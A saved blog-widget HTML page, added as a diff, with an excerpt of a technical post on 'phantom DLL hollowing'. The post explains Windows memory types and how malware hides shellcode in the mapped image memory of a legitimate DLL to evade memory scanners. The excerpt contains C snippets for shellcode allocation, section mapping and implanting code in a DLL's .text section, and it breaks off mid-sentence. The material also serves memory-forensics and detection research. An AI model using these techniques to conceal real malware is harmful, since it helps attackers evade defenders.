@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en"><head dir="ltr">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+
+    
+
+      
+  
+  
+
+
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://www.wix.com/favicon.ico">
+
+
+
+
+  <script type="text/javascript">
+  (function(x,e,o,s,n){var a=window.fedops||{};a.apps=a.apps||{};a.apps[x]={startLoadTime:e&&e.now&&e.now()};try{a.sessionId=o.getItem("fedops.logger.sessionId")}catch(x){}a.sessionId=a.sessionId||"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(x){var e=s()*16|0,o=x=="x"?e:e&3|8;return o.toString(16)});window.fedops=a;var d="//frog.wix.com/fed?appName="+x+"&src=72&evid=14&session_id="+a.sessionId+"&_="+s();if(!!n&&!!n.sendBeacon){n.sendBeacon(d)}else{(new Image).src=d}})('communities-blog-custom-feed-widget',window.performance,window.localStorage,Math.random,window.navigator);
+</script>
+
+
+
+
+      
+      
+<script>
+  try {
+    if (window.parent) {
+      var msgSent = false;
+      var vars = window.location.search.replace('?', '').split('&');
+      for (var i = 0; i < vars.length; i++) {
+        var arr = vars[i].split('=');
+        if (arr[0] == 'compId') {
+          window.parent.postMessage('{"intent":"TPA2","callId":1,"type":"appIsAlive","compId":"' + arr[1] + '","deviceType":"desktop","data":{"version":"1.66.0"}}', '*')
+          msgSent = true;
+        }
+      }
+      if (!msgSent) {
+        console.info('couldn\'t find compId in', window.location);
+      }
+    }
+  } catch (e) {
+    console.error('Error posting keep alive msg', e);
+  }
+</script>
+
+      
+
+      
+        <script src="modal_data/polyfill.js" crossorigin=""></script>
+
+        
+    <script src="modal_data/bundle.js" crossorigin="anonymous"></script>
+    <script>
+      (function initSentry() {
+        function isDuplexerError(event) {
+          try {
+            var stackFrames = event.exception.values[0].stacktrace.frames;
+            return /@wix\/wix-duplexer-js/.test(stackFrames[stackFrames.length - 1].filename);
+          } catch (error) {
+            return false;
+          }
+        }
+
+        Sentry.init({
+          dsn: 'https://71e32b4ded27414b90a94adb4e8b4d23@sentry.wixpress.com/94',
+          beforeSend: function beforeSend(event) {
+            return isDuplexerError(event) ? null : event;
+          },
+        });
+
+        Sentry.configureScope(function(scope) {
+          var p = function(x) { return x.split('=', 2).map(decodeURIComponent); };
+          var r = function(acc, x) { acc[x[0]] = x[1]; return acc; };
+          var q = location.search.replace(/^\?/, '').split('&').map(p).reduce(r, {});
+          
+          scope.setTag('bundleName', 'custom-feed-widget');
+          scope.setTag('instanceId', '78e72780-ec1a-4e43-97c1-217c79d55e2f');
+          scope.setTag('viewMode', q.viewMode);
+          scope.setTag('deviceType', q.deviceType);
+          scope.setTag('locale', q.locale);
+        });
+      })();
+    </script>
+  
+        
+      
+
+      
+        <link rel="stylesheet" type="text/css" href="dispatcher_data/css.css">
+<link rel="stylesheet" type="text/css" href="custom-feed-widget_data/languages.css">
+<link rel="stylesheet" type="text/css" href="malicious-memory-artifacts-part-i-dll-hollowing_data/languages.css">
+<link rel="stylesheet" type="text/css" href="dispatcher_data/languages.css">
+<link rel="stylesheet" type="text/css" href="custom-feed-widget_data/custom-feed-widget.css">
+        
+  <style>@font-face {
+font-family: wf_a06df987aac84453946eecb85;
+src: url("https://static.wixstatic.com/ufonts/c1d8f6_a06df987aac84453946eecb8586c794d/woff/file.woff") format("woff"),
+url("https://static.wixstatic.com/ufonts/c1d8f6_a06df987aac84453946eecb8586c794d/woff2/file.woff2") format("woff2"),
+url("https://static.wixstatic.com/ufonts/c1d8f6_a06df987aac84453946eecb8586c794d/ttf/file.ttf") format("ttf");
+}
+</style>
+
+
+<style wix-style="">
+  /* Widget styles */
+  .blog-background-color { background-color: rgba(255,255,255,0); }
+	.blog-background-color { background-color: rgba(255,255,255,0); }
+
+  /* Post styles */
+  .blog-text-color { color: rgba(179,179,179,1); }
+	.blog-text-color { color: rgba(179,179,179,1); }
+	.blog-text-border-color { border-color: rgba(179,179,179,1); }
+	.blog-text-border-color { border-color: rgba(179,179,179,1); }
+	.blog-text-background-color { background-color: rgba(179,179,179,1); }
+	.blog-text-background-color { background-color: rgba(179,179,179,1); }
+  .blog-icon-fill { fill: rgba(179,179,179,1); }
+	.blog-icon-fill { fill: rgba(179,179,179,1); }
+	.blog-icon-stroke { stroke: rgba(179,179,179,1); }
+	.blog-icon-stroke { stroke: rgba(179,179,179,1); }
+  .blog-separator-background-color { background-color: rgba(179,179,179,1); }
+	.blog-separator-background-color { background-color: rgba(179,179,179,1); }
+  .blog-inverted-separator-background-color { background-color: rgba(255,255,255,0); }
+	.blog-inverted-separator-background-color { background-color: rgba(255,255,255,0); }
+  .blog-card-background-color { background-color: rgba(255,255,255,0); }
+	.blog-card-background-color { background-color: rgba(255,255,255,0); }
+	.blog-card-fill { fill: rgba(255,255,255,0); }
+	.blog-card-fill { fill: rgba(255,255,255,0); }
+	.blog-card-stroke { stroke: rgba(255,255,255,0); }
+	.blog-card-stroke { stroke: rgba(255,255,255,0); }
+	.blog-card-color { color: rgba(255,255,255,0); }
+	.blog-card-color { color: rgba(255,255,255,0); }
+  .blog-card-border-color { border-color: rgba(246,246,246,0.75); }
+	.blog-card-border-color { border-color: rgba(246,246,246,0.75); }
+  .blog-post-title-color { color: rgba(179,179,179,1); }
+	.blog-post-title-color { color: rgba(179,179,179,1); }
+  .blog-post-image-overlay-background-color { background-color: rgba(0,0,0,0.35); }
+	.blog-post-image-overlay-background-color { background-color: rgba(0,0,0,0.35); }
+
+  .blog-post-title-font { font:normal normal normal 25px/1.4em georgia,palatino,"book antiqua","palatino linotype",serif; font-size: 28px; line-height: normal; }
+	.blog-post-title-font { font:normal normal normal 28px/35px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas; line-height: normal; }
+	.blog-post-title-font { font:normal normal normal 28px/35px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas; line-height: normal; }
+  .blog-post-description-font { font:normal normal normal 16px/1.4em "libre baskerville",serif; font-size: 16px; line-height: normal; }
+	.blog-post-description-font { font:normal normal normal 16px/20px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas; line-height: normal; }
+	.blog-post-description-font { font:normal normal normal 16px/20px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas; line-height: normal; }
+
+  /* Button styles */
+  .blog-button-primary-text-color { color: #FFFFFF; }
+	.blog-button-primary-text-color { color: #FFFFFF; }
+	.blog-button-primary-text-background-color { background-color: #FFFFFF; }
+	.blog-button-primary-text-background-color { background-color: #FFFFFF; }
+  .blog-button-primary-icon-fill { fill: #FFFFFF; }
+	.blog-button-primary-icon-fill { fill: #FFFFFF; }
+  .blog-button-secondary-text-color { color: #30BDFF; }
+	.blog-button-secondary-text-color { color: #30BDFF; }
+  .blog-button-secondary-icon-fill { fill: #30BDFF; }
+	.blog-button-secondary-icon-fill { fill: #30BDFF; }
+  .blog-button-color { color: #30BDFF; }
+	.blog-button-color { color: #30BDFF; }
+	.blog-button-background-color { background-color: #30BDFF; }
+	.blog-button-background-color { background-color: #30BDFF; }
+	.blog-button-border-color { border-color: #30BDFF; }
+	.blog-button-border-color { border-color: #30BDFF; }
+	.blog-button-fill { fill: #30BDFF; }
+	.blog-button-fill { fill: #30BDFF; }
+	.blog-button-stroke { stroke: #30BDFF; }
+	.blog-button-stroke { stroke: #30BDFF; }
+  .is-desktop .blog-button-hover-color:hover { color: rgba(148,130,27,1); }
+	.is-desktop .blog-button-hover-color:hover { color: rgba(148,130,27,1); }
+	.is-desktop .blog-button-hover-fill:hover { fill: rgba(148,130,27,1); }
+	.is-desktop .blog-button-hover-fill:hover { fill: rgba(148,130,27,1); }
+  .is-desktop .blog-link-hover-color:hover { color: rgba(148,130,27,1); }
+	.is-desktop .blog-link-hover-color:hover { color: rgba(148,130,27,1); }
+	.is-desktop .blog-link-hover-fill:hover { fill: rgba(148,130,27,1); }
+	.is-desktop .blog-link-hover-fill:hover { fill: rgba(148,130,27,1); }
+  .is-desktop .blog-hover-container:hover .blog-hover-container-element-color { color: rgba(148,130,27,1); }
+	.is-desktop .blog-hover-container:hover .blog-hover-container-element-color { color: rgba(148,130,27,1); }
+	.is-desktop .blog-hover-container:hover .blog-hover-container-element-fill { fill: rgba(148,130,27,1); }
+	.is-desktop .blog-hover-container:hover .blog-hover-container-element-fill { fill: rgba(148,130,27,1); }
+  .is-desktop .blog-button-hover-after-border-color:hover::after { border-color: #30BDFF; }
+	.is-desktop .blog-button-hover-after-border-color:hover::after { border-color: #30BDFF; }
+  .blog-button-after-border-color::after { border-color: #30BDFF; }
+	.blog-button-after-border-color::after { border-color: #30BDFF; }
+
+  /* Fixed styles */
+  .blog-default-card-background-color { background-color: #FFFFFF; }
+	.blog-default-card-background-color { background-color: #FFFFFF; }
+  .blog-default-button-background-color { background-color: #30BDFF; }
+	.blog-default-button-background-color { background-color: #30BDFF; }
+  .blog-quote-border-color { border-color: #41BAAE; }
+	.blog-quote-border-color { border-color: #41BAAE; }
+</style>
+
+      
+    <style wix-style="">.Title{ font:normal normal normal 89px/1.4em georgia,palatino,"book antiqua","palatino linotype",serif; } .Menu{ font:normal normal normal 16px/1.4em din-next-w01-light,din-next-w02-light,din-next-w10-light,sans-serif; } .Page-title{ font:normal normal normal 25px/1.4em georgia,palatino,"book antiqua","palatino linotype",serif; } .Heading-XL{ font:normal normal normal 60px/1.4em din-next-w01-light,din-next-w02-light,din-next-w10-light,sans-serif; } .Heading-L{ font:normal normal normal 58px/1.4em georgia,palatino,"book antiqua","palatino linotype",serif; } .Heading-M{ font:italic normal normal 22px/1.4em georgia,palatino,"book antiqua","palatino linotype",serif; } .Heading-S{ font:normal normal normal 21px/1.4em dinneuzeitgroteskltw01-_812426,sans-serif; } .Body-L{ font:normal normal normal 22px/1.4em "libre baskerville",serif; } .Body-M{ font:normal normal normal 16px/1.4em "libre baskerville",serif; } .Body-S{ font:normal normal normal 14px/1.4em georgia,palatino,"book antiqua","palatino linotype",serif; } .Body-XS{ font:normal normal normal 12px/1.4em din-next-w01-light,din-next-w02-light,din-next-w10-light,sans-serif; } }</style><link type="text/css" rel="stylesheet" href="dispatcher_data/css.css" id="wix-google-fonts"><style>@font-face {
+font-family: wf_a06df987aac84453946eecb85;
+src: url("https://static.wixstatic.com/ufonts/c1d8f6_a06df987aac84453946eecb8586c794d/woff/file.woff") format("woff"),
+url("https://static.wixstatic.com/ufonts/c1d8f6_a06df987aac84453946eecb8586c794d/woff2/file.woff2") format("woff2"),
+url("https://static.wixstatic.com/ufonts/c1d8f6_a06df987aac84453946eecb8586c794d/ttf/file.ttf") format("ttf");
+}
+</style><link type="text/css" rel="stylesheet" href="dispatcher_data/languages.css"><style>:focus {
+    outline: none;
+}
+
+.js-focus-visible .focus-visible:focus,
+.js-focus-visible .focus-visible:focus ~ .wixSdkShowFocusOnSibling
+{
+    box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.9), 0 0 1px 2px #3899EC;
+}
+</style><script src="modal_data/focus-visible.js" id="dynamic_script_FOCUS_VISIBLE"></script></head>
+
+    <body class="oSNla js-focus-visible">
+      
+
+      <div id="root"><div id="direction-provider-wrapper"><div dir="ltr"><div class="_2oAx1 blog-background-color is-desktop app-desktop" id="content-wrapper"><div class="cSnEi"><div></div><div><div><div class="_3sa-M _2QKd6 _3iZiL post-list _2m0HZ"><div><div class="_2QKd6"><div class="tZgfA _2QKd6"><div class="_sg9w"><div class="_1GFPu"><article class="dJBp- _2bQy8 _2lmPI blog-post-description-font blog-text-color blog-card-background-color blog-card-border-color post-list-item blog-hover-container _1ZW5T" tabindex="0" style="border-width:1px" data-hook="post-list-item"><div class="T-BZz _1ZW5T"><a tabindex="-1" href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing" target="_top" class="blog-link-hover-color"><div class="_3RKAW _3-Hjr" data-hook="post-list-item-image"><div class="_1mvj7" style="background-image: url(&quot;https://static.wixstatic.com/media/c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg/v1/fit/w_469,h_555,al_c,q_80/file.png&quot;); background-size: cover;" data-pin-url="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing"></div></div></a></div><div class="_3kcJF _2bQy8 _2lmPI _1Twkt _1ZW5T"><div class="blog-post-description-font"><div class="_3CJpQ eRN8O blog-post-metadata-font post-header"><div class="gui6j"><div class="_2wbeQ"><span class="_25KXg"><span class="_2MJF1 user-name _1Gv8s blog-link-hover-color blog-text-color" data-hook="user-name">forrestorr</span><div aria-label="Admin" data-hook="badge" class="Cu6fU"><svg xmlns="http://www.w3.org/2000/svg" width="19" viewBox="0 0 19 19" style="fill-rule:evenodd" class="blog-icon-fill"><path d="M15.3812,6.495914 L12.6789333,8.77258837 C12.6191333,8.84477644 12.5099333,8.85722265 12.4354,8.79997005 C12.4215333,8.79001308 12.4094,8.77756686 12.3998667,8.76429089 L9.78686667,6.14327115 C9.67766667,5.99225704 9.46186667,5.95491839 9.305,6.05863687 C9.26946667,6.08186981 9.23913333,6.11091099 9.21573333,6.14493065 L6.60013333,8.81075677 C6.5464,8.88626383 6.43893333,8.90534803 6.3592,8.85390366 C6.34446667,8.84394669 6.33146667,8.83233022 6.32106667,8.81905425 L3.61966667,6.50587098 C3.5018,6.36149485 3.28426667,6.33577266 3.13346667,6.44861837 C3.0494,6.51167921 3,6.60792997 3,6.70998895 L4,14 L15,14 L16,6.70169148 C16,6.51831719 15.8448667,6.36979232 15.6533333,6.36979232 C15.5476,6.36979232 15.4470667,6.41625821 15.3812,6.495914 Z"></path></svg></div></span><ul class="_1ReRx _2qkGq"><li><span class="post-metadata__date time-ago" data-hook="time-ago">Oct 2</span></li><li><div class="_2yYN5 e8kGb blog-separator-background-color"></div></li><li><span class="post-metadata__readTime" data-hook="time-to-read">14 min</span></li></ul></div></div></div></div><a class="_1NTXA _2bQy8 _2lmPI" href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing" target="_top"><div class="_3sZWk blog-post-title-font _2bQy8 _2lmPI" data-hook="post-title"><h2 class="_2MNte post-title post-title__text blog-post-title-color blog-hover-container-element-color" data-hook="post-title"><div style="overflow: hidden; text-overflow: ellipsis; -moz-box-orient: vertical; display: -webkit-box; -webkit-line-clamp: 3;">Masking Malicious Memory Artifacts – Part I: Phantom DLL Hollowing</div></h2></div><div class="-RDEl _2bQy8 blog-post-description-font" data-hook="post-description"><div class="_1Uunh post-excerpt"><div style="overflow: hidden; text-overflow: ellipsis; -moz-box-orient: vertical; display: -webkit-box; -webkit-line-clamp: 2;"><div class="AB7h6" data-hook="post-description">Introduction
+ I've written this article with the intention of improving the skill of 
+the reader as relating to the topic of memory stealth when designing 
+malware. First by detailing a technique I term DLL hollowing which has 
+not yet gained widespread recognition among attackers, and second by 
+introducing the reader to one of my own variations of this technique 
+which I call phantom DLL hollowing (the PoC for which can be found on 
+Github). This will be the first post in a series on malware forensics 
+and bypassing defensive scanners. It was written with the assumption 
+that the reader understands the basics of Windows internals and malware 
+design. Legitimate memory allocation In order to understand how 
+defenders are able to pick up on malicious memory artifacts with minimal
+ false positives using point-in-time memory scanners such as 
+Get-InjectedThread and malfind it is essential for one to understand 
+what constitutes “normal” memory allocation and how malicious allocation
+ deviates from this norm. For our purposes, typical process memory can 
+be broken up into 3 different categories: Private memory – not to be 
+confused with memory that is un-shareable with other processes. All 
+memory allocated via NTDLL.DLL!NtAllocateVirtualMemory falls into this 
+category (this includes heap and stack memory). Mapped memory – mapped 
+views of sections which may or may not be created from files on disk. 
+This does not include PE files mapped from sections created with the 
+SEC_IMAGE flag. Image memory – mapped views of sections created with the
+ SEC_IMAGE flag from PE files on disk. This is distinct from mapped 
+memory. Although image memory is technically a mapped view of a file on 
+disk just as mapped memory may be, they are distinctively different 
+categories of memory. These categories directly correspond to the Type 
+field in the MEMORY_BASIC_INFORMATION structure. This structure is 
+strictly a usermode concept, and is not stored independently but rather 
+is populated using the kernel mode VAD, PTE and section objects 
+associated with the specified process. On a deeper level the key 
+difference between private and shared (mapped/image) memory is that 
+shared memory is derived from section objects, a construct specifically 
+designed to allow memory to be shared between processes. With this being
+ said, the term “private memory” can be a confusing terminology in that 
+it implies all sections are shared between processes, which is not the 
+case. Sections and their related mapped memory may also be private 
+although they will not technically be “private memory,” as this term is 
+typically used to refer to all memory which is never shared (not derived
+ from a section). The distinction between mapped and image memory stems 
+from the control area of their foundational section object. In order to 
+give the clearest possible picture of what constitutes legitimate memory
+ allocation I wrote a memory scanner (the PoC for which can be found on 
+Github) which uses the characteristics of the MEMORY_BASIC_INFORMATION 
+structure returned by KERNEL32.DLL!VirtualQuery to statistically 
+calculate the most common permission attributes of each of the three 
+aforementioned memory types across all accessible processes. In the 
+screenshot below I've executed this scanner on an unadulterated Windows 8
+ VM. Understanding these statistics is not difficult. The majority of 
+private memory is +RW, consistent with its usage in stack and heap 
+allocation. Mapped memory is largely readonly, an aspect which is also 
+intuitive considering that the primary usage of such memory is to map 
+existing .db, .mui and .dat files from disk into memory for the 
+application to read. Most notably from the perspective of a malware 
+writer is that executable memory is almost exclusively the domain of 
+image mappings. In particular +RX regions (as opposed to +RWX) which 
+correspond to the .text sections of DLL modules loaded into active 
+processes. In Figure 2, taken from the memory map of an explorer.exe 
+process, image memory is shown split into multiple separate regions. 
+Those corresponding to the PE header and subsequent sections, along with
+ a predictable set of permissions (+RX for .text, +RW for .data, +R for 
+.rsrc and so forth). The Info field is actually an abstraction of x64dbg
+ and not a characteristic of the memory itself: x64dbg has walked the 
+PEB loaded module list searching for an entry with a base address that 
+matches the region base, and then set the Info for its PE headers to the
+ module name, and each subsequent region within the map has had its Info
+ set to its corresponding IMAGE_SECTION_HEADER.Name, as determined by 
+calculating which regions correspond to each mapped image base + 
+IMAGE_SECTION_HEADER.VirtualAddress. Classic malware memory allocation 
+Malware writers have a limited set of tools in their arsenal to allocate
+ executable memory for their code. This operation is however essential 
+to process injection, process hollowing and packers/crypters. In brief, 
+the classic technique for any form of malicious code allocation involved
+ using NTDLL.DLL!NtAllocateVirtualMemory to allocate a block of +RWX 
+permission memory and then writing either a shellcode or full PE into 
+it, depending on the genre of attack. uint8_t* pShellcodeMemory = 
+(uint8_t*)VirtualAlloc( nullptr, dwShellcodeSize, 
+MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
+memcpy(pShellcodeMemory, Shellcode, dwShellcodeSize); CreateThread( 
+nullptr, 0, (LPTHREAD_START_ROUTINE)pShellcodeMemory, nullptr, 0, 
+nullptr); Later this technique evolved as both attackers and defenders 
+increased in sophistication, leading malware writers to use a 
+combination of NTDLL.DLL!NtAllocateVirtualMemory with +RW permissions 
+and NTDLL.DLL!NtProtectVirtualMemory after the malicious code had been 
+written to the region to set it to +RX before execution. In the case of 
+process hollowing using a full PE rather than a shellcode, attackers 
+begun correctly modifying the permissions of +RW memory they allocated 
+for the PE to reflect the permission characteristics of the PE on a 
+per-section basis. The benefit of this was twofold: no +RWX memory was 
+allocated (which is suspicious in of itself) and the VAD entry for the 
+malicious region would still read as +RW even after the permissions had 
+been modified, further thwarting memory forensics. uint8_t* 
+pShellcodeMemory = (uint8_t*)VirtualAlloc( nullptr, dwShellcodeSize, 
+MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE); memcpy(pShellcodeMemory, 
+Shellcode, dwShellcodeSize); VirtualProtect( pShellcodeMemory, 
+dwShellcodeSize, PAGE_EXECUTE_READ, (PDWORD)&amp;dwOldProtect); 
+CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)pShellcodeMemory, 
+nullptr, 0, nullptr); More recently, attackers have transitioned to an 
+approach of utilizing sections for their malicious code execution. This 
+is achieved by first creating a section from the page file which will 
+hold the malicious code. Next the section is mapped to the local process
+ (and optionally a remote one as well) and directly modified. Changes to
+ the local view of the section will also cause remote views to be 
+modified as well, thus bypassing the need for APIs such as 
+KERNEL32.DLL!WriteProcessMemory to write malicious code into remote 
+process address space. LARGE_INTEGER SectionMaxSize = { 0,0 }; NTSTATUS 
+NtStatus SectionMaxSize.LowPart = dwShellcodeSize; NtStatus = 
+NtCreateSection( &amp;hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ |
+ SECTION_MAP_WRITE, NULL, &amp;SectionMaxSize, PAGE_EXECUTE_READWRITE, 
+SEC_COMMIT, NULL); if (NT_SUCCESS(NtStatus)) { NtStatus = 
+NtMapViewOfSection( hSection, GetCurrentProcess(), (void 
+**)&amp;pShellcodeMemory, NULL, NULL, NULL, &amp;cbViewSize, 2, NULL, 
+PAGE_EXECUTE_READWRITE); if (NT_SUCCESS(NtStatus)) { 
+memcpy(pShellcodeMemory, Shellcode, dwShellcodeSize); CreateThread( 
+nullptr, 0, (LPTHREAD_START_ROUTINE)pShellcodeMemory, nullptr, 0, 
+nullptr); } } While this has the benefit of being (at present) slightly 
+less common than direct virtual memory allocation with 
+NTDLL.DLL!NtAllocateVirtualMemory, it creates similar malicious memory 
+artifacts for defenders to look out for. One key difference between the 
+two methods is that NTDLL.DLL!NtAllocateVirtualMemory will allocate 
+private memory, whereas mapped section views will allocate mapped memory
+ (shared section memory with a data control area). While a malware 
+writer may avoid the use of suspicious (and potentially monitored) APIs 
+such as NTDLL.DLL!NtAllocateVirtualMemory and 
+NTDLL.DLL!NtProtectVirtualMemory the end result in memory is ultimately 
+quite similar with the key difference being the distinction between a 
+MEM_MAPPED and MEM_PRIVATE memory type assigned to the shellcode memory.
+ DLL hollowing With these concepts in mind, it's clear that masking 
+malware in memory means utilizing +RX image memory, in particular the 
+.text section of a mapped image view. The primary caveat to this is that
+ such memory cannot be directly allocated, nor can existing memory be 
+modified to mimic these attributes. Only the PTE which stores the active
+ page permissions is mutable, while the VAD and section object control 
+area which mark the region as image memory and associate it to its 
+underlying DLL on disk are immutable. For this reason, properly 
+implementing a DLL hollowing attack implies infection of a mapped view 
+generated from a real DLL file on disk. Such DLL files should have a 
+.text section with a IMAGE_SECTION_HEADER.Misc.VirtualSize greater than 
+or equal to the size of the shellcode being implanted, and should not 
+yet be loaded into the target process as this implies their modification
+ could result in a crash. GetSystemDirectoryW(SearchFilePath, MAX_PATH);
+ wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll"); if ((hFind = 
+FindFirstFileW(SearchFilePath, &amp;Wfd)) != INVALID_HANDLE_VALUE) { do {
+ if (GetModuleHandleW(Wfd.cFileName) == nullptr) { ... } } while 
+(!bMapped &amp;&amp; FindNextFileW(hFind, &amp;Wfd)); FindClose(hFind); }
+ In this code snippet I’ve enumerated files with a .dll extension in 
+system32 and am ensuring they are not already loaded into my process 
+using KERNEL32.DLL!GetModuleFileNameW, which walks the PEB loaded 
+modules list and returns their base address (the same thing as their 
+module handle) if a name match is found. In order to create a section 
+from the image I first need to open a handle to it. I’ll discuss TxF in 
+the next section, but for the sake of this code walkthrough we can 
+assume KERNEL.DLL!CreateFileW is used. Upon opening this handle I can 
+read the contents of the PE and validate its headers, particularly its 
+IMAGE_SECTION_HEADER.Misc.VirtualSize field which indicates a sufficient
+ size for my shellcode. uint32_t dwFileSize = GetFileSize(hFile, 
+nullptr); uint32_t dwBytesRead = 0; pFileBuf = new uint8_t[dwFileSize]; 
+if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&amp; dwBytesRead, 
+nullptr)) { SetFilePointer(hFile, 0, nullptr, FILE_BEGIN); 
+IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf; 
+IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + 
+pDosHdr-&gt;e_lfanew); IMAGE_SECTION_HEADER* pSectHdrs = 
+(IMAGE_SECTION_HEADER*)((uint8_t*)&amp; pNtHdrs-&gt;OptionalHeader + 
+sizeof(IMAGE_OPTIONAL_HEADER)); if (pNtHdrs-&gt;OptionalHeader.Magic == 
+IMAGE_NT_OPTIONAL_HDR_MAGIC) { if (dwReqBufSize &lt; 
+pNtHdrs-&gt;OptionalHeader.SizeOfImage &amp;&amp; 
+(_stricmp((char*)pSectHdrs-&gt;Name, ".text") == 0 &amp;&amp; 
+dwReqBufSize &lt; pSectHdrs-&gt;Misc.VirtualSize)) ... } } ... } When a 
+valid PE is found a section can be created from its file handle, and a 
+view of it mapped to the local process memory space. HANDLE hSection = 
+nullptr; NtStatus = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, 
+nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); if 
+(NT_SUCCESS(NtStatus)) { *pqwMapBufSize = 0; NtStatus = 
+NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 
+0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); ... } The 
+unique characteristic essential to this technique is the use of the 
+SEC_IMAGE flag to NTDLL.DLL!NtCreateSection. When this flag is used, the
+ initial permissions parameter is ignored (all mapped images end up with
+ an initial allocation permission of +RWXC). Also worth noting is that 
+the PE itself is validated by NTDLL.DLL!NtCreateSection at this stage, 
+and if it is invalid in any way NTDLL.DLL!NtCreateSection will fail 
+(typically with error 0xc0000005). Finally, the region of memory 
+corresponding to the .text section in the mapped view can be modified 
+and implanted with the shellcode. *ppMappedCode = *ppMapBuf + 
+pSectHdrs-&gt;VirtualAddress + dwCodeRva; if (!bTxF) { uint32_t 
+dwOldProtect = 0; if (VirtualProtect(*ppMappedCode, dwReqBufSize, 
+PAGE_READWRITE, (PDWORD)&amp; dwOldProtect)) { memcpy(*ppMappedCode, 
+pCodeBuf, dwReqBufSize); if (VirtualProtect(*ppMappedCode, dwReqBufSize,
+ dwOldProtect, (PDWORD)&amp; dwOldProtect)) { bMapped = true; } } } else
+ { bMapped = true; } Once the image section has been generated and a 
+view of it has been mapped into the process memory space, it will share 
+many characteristics in common with a module legitimately loaded via 
+NTDLL.DLL!LdrLoadDll but with several key differences: Relocations will 
+be applied, but imports will not yet be resolved. The module will not 
+have been added to the loaded modules list in usermode process memory. 
+The loaded modules list is referenced in the LoaderData field of the 
+PEB: typedef struct _PEB { BOOLEAN                 
+InheritedAddressSpace; // 0x0 BOOLEAN                 
+ReadImageFileExecOptions; // 0x1 BOOLEAN                 BeingDebugged; 
+// 0x2 BOOLEAN                 Spare; // 0x3 #ifdef _WIN64 uint8_t      
+              Padding1[4]; #endif HANDLE                  Mutant; // 0x4
+ / 0x8 void *                  ImageBase; // 0x8 / 0x10 PPEB_LDR_DATA   
+        LoaderData; // 0xC / 0x18 ... } There are three such lists, all 
+representing the same modules in a different ordering. typedef struct 
+_LDR_MODULE { LIST_ENTRY              InLoadOrderModuleList; LIST_ENTRY 
+             InMemoryOrderModuleList; LIST_ENTRY              
+InInitializationOrderModuleList; void *                  BaseAddress; 
+void *                  EntryPoint; ULONG                   SizeOfImage;
+ UNICODE_STRING          FullDllName; UNICODE_STRING          
+BaseDllName; ULONG                   Flags; SHORT                   
+LoadCount; SHORT                   TlsIndex; LIST_ENTRY              
+HashTableEntry; ULONG                   TimeDateStamp; } LDR_MODULE, 
+*PLDR_MODULE; typedef struct _PEB_LDR_DATA { ULONG                   
+Length; ULONG                   Initialized; void *                  
+SsHandle; LIST_ENTRY              InLoadOrderModuleList; LIST_ENTRY     
+         InMemoryOrderModuleList; LIST_ENTRY              
+InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; It’s 
+important to note that to avoid leaving suspicious memory artifacts 
+behind, an attacker should add their module to all three of the lists. 
+In Figure 3 (shown below) I’ve executed my hollower PoC without 
+modifying the loaded modules list in the PEB to reflect the addition of 
+the selected hollowing module (aadauthhelper.dll). Using x64dbg to view 
+the memory allocated for the aadauthhelper.dll base at 
+0x00007ffd326a0000 we can see that despite its IMG tag, it looks 
+distinctly different from the other IMG module memory surrounding it. 
+This is because the association between a region of image memory and its
+ module is inferred rather than explicitly recorded. In this case, 
+x64dbg is scanning the aforementioned PEB loaded modules list for an 
+entry with a BaseAddress of 0x00007ffd326a0000 and upon not finding one,
+ does not associate a name with the region or associate its subsections 
+with the sections from its PE header. Upon adding aadauthhelper.dll to 
+the loaded modules lists, x64dbg shows the region as if it corresponded 
+to a legitimately loaded module. Comparing this artificial module 
+(implanted with shellcode) with a legitimately loaded aadauthhelper.dll 
+we can see there is no difference from the perspective of a memory 
+scanner. Only once we view the .text sections in memory and compare them
+ between the legitimate and hollowed versions of aadauthhelper.dll can 
+we see the difference. Phantom hollowing DLL hollowing does in of itself
+ represent a major leap forward in malware design. Notably though, the 
++RX characteristic of the .text section conventionally forces the 
+attacker into a position of manually modifying this region to be +RW 
+using an API such as NTDLL.DLL!NtProtectVirtualMemory after it has been 
+mapped, writing their shellcode to it and then switching it back to +RX 
+prior to execution. This sets off two different alarms for a 
+sophisticated defender to pick up on: Modification of the permissions of
+ a PTE associated with image memory after it has already been mapped 
+using an API such as NTDLL.DLL!NtProtectVirtualMemory. A new private 
+view of the modified image section being created within the afflicted 
+process memory space. While the first alarm is self-explanatory the 
+second merits further consideration. It may be noted in Figure 2 that 
+the initial allocation permissions of all image related memory is +RWXC,
+ or PAGE_EXECUTE_WRITECOPY. By default, mapped views of image sections 
+created from DLLs are shared as a memory optimization by Windows. For 
+example, only one copy of kernel32.dll will reside in physical memory 
+but will be shared throughout the virtual address space of every process
+ via a shared section object. Once the mapped view of a shared section 
+is modified, a unique (modified) copy of it will be privately stored 
